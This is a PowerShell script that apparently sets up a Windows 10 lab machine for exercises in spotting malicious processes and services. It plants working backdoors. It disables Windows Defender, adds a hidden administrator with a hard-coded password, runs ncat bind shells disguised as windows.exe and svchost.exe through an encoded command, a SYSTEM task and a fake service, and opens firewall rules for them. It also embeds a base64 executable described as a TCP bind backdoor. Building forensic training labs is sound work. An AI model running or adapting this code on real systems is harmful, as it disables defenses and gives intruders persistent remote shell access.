<# 

.SYNOPSIS
PROCESS AND SERVICE ENUMERATION
AUTHOR: BRANDON WILBUR
DATE: 2/19/2021

.DESCRIPTION
This script will configure a Windows 10 Workstation with backdoors and legitimate software for identification of running binaries.
Sysinternals tools are used as well as Nirsoft CurrPorts in order to enumerate processes and network connections on the host.

.NOTES
- Disable Windows Defender
- Add user
- Install Chocolatey Package Manager
- Set network profile to private
- Install Nirsoft CurrPorts, Process Explorer, Autoruns and Dropbox
- Create Ncat backdoor via scheduled task
- Create Ncat backdoor via service
- Create TCP Bind Backdoor via service
- Enable WinRM
- Restart Computer

.EXAMPLE
.\process-service-enumeration.ps1

#>

### DISABLE DEFENDER ###

Set-MpPreference -DisableRealtimeMonitoring $True
New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value '1' `
    -PropertyType DWORD -Force
Add-MpPreference -ExclusionPath 'C:\'


### ADD USER ###

$Password = ConvertTo-SecureString 'E@rth!' -AsPlainText -Force
New-LocalUser 'toph' -FullName 'Toph' -Password $Password
Add-LocalGroupMember -Group 'Administrators' -Member 'toph'


### DOWNLOAD CHCOLATEY ###

[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072 
Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))
RefreshEnv.cmd


### SET PRIVATE NETWORK ###

$active_interface = Get-NetConnectionProfile | Select-Object -ExpandProperty InterfaceIndex 
Set-NetConnectionProfile -InterfaceIndex $active_interface -NetworkCategory "Private"


### INSTALL NIRSOFT CURRPORTS AND PROCESS EXPLORER ###

choco install cports procexp dropbox autoruns -y

# Create link on desktop to Currports

$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut('C:\Users\Public\Desktop\CurrPorts.lnk')
$Shortcut.TargetPath = 'C:\ProgramData\chocolatey\bin\cports.exe'
$Shortcut.WindowStyle = 7
$Shortcut.Save()

# Create link on desktop to Process Explorer

$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut('C:\Users\Public\Desktop\Process Explorer.lnk')
$Shortcut.TargetPath = 'C:\ProgramData\chocolatey\bin\procexp.exe'
$Shortcut.WindowStyle = 7
$Shortcut.Save()

# Create link on desktop to Autoruns
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut('C:\Users\Public\Desktop\Autoruns.lnk')
$Shortcut.TargetPath = 'C:\ProgramData\chocolatey\bin\Autoruns.exe'
$Shortcut.WindowStyle = 7
$Shortcut.Save()


### CONFIGURE NCAT BACKDOOR AS A SCHEDULED TASK ###

# Download ncat portable, place it within folder and remove original download

Invoke-WebRequest -Uri 'http://nmap.org/dist/ncat-portable-5.59BETA1.zip' -OutFile "$HOME\AppData\Local\Temp\nc.zip" -UseBasicParsing

Expand-Archive -LiteralPath "$HOME\AppData\Local\Temp\nc.zip" -DestinationPath "$HOME\AppData\Local\Temp\"

$Download_Location = (Get-ChildItem -Path "$HOME\AppData\Local\Temp\*\ncat.exe" | Select-Object Directory | Format-Table -HideTableHeaders | Out-String).Trim() + "\ncat.exe"

Move-Item -Path $Download_Location -Destination "C:\Windows\Temp\windows.exe"

Remove-Item -Path "$HOME\AppData\Local\Temp\*" -Recurse

# Translates to: Start-Process -FilePath "C:\Windows\Temp\windows.exe" -ArgumentList "-l -p 55256 -e cmd" -WindowStyle Hidden
$PowerShell_RunNcat = 'PowerShell.exe -EncodedCommand "UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcAHcAaQBuAGQAbwB3AHMALgBlAHgAZQAiACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgACIALQBsACAALQBwACAANQA1ADIANQA2ACAALQBlACAAYwBtAGQAIgAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4A"'

# Create a PowerShell script on disk containing the encoded command
Set-Content -Path 'C:\Windows\Temp\cloud-security.ps1' -Value $PowerShell_RunNcat

# Create scheduled task to run script

schtasks /Create /RU SYSTEM /SC ONSTART /TN Windows /TR 'PowerShell.exe -File "C:\Windows\Temp\cloud-security.ps1"'

# Set firewall rule to allow backdoor communication

New-NetFirewallRule -DisplayName 'Microsoft Cloud Security' -Program "C:\Windows\Temp\windows.exe" -Action Allow


### CONFIGURE NCAT BACKDOOR TO RUN AS A SERVICE ###

Copy-Item -Path 'C:\Windows\Temp\windows.exe' -Destination 'C:\Windows\svchost.exe'

New-Service -Name "svchost" -BinaryPathName 'cmd /C C:\Windows\svchost.exe -l -p 28354 -e powershell' -DisplayName "Host Process for Windows Services" -StartupType Automatic

New-NetFirewallRule -DisplayName 'Host Process for Windows Services' -Program "C:\Windows\svchost.exe" -Action Allow


### CREATE TCP BIND BACKDOOR ###

# Base64-encoded data

$tcp_bind = "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zMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMz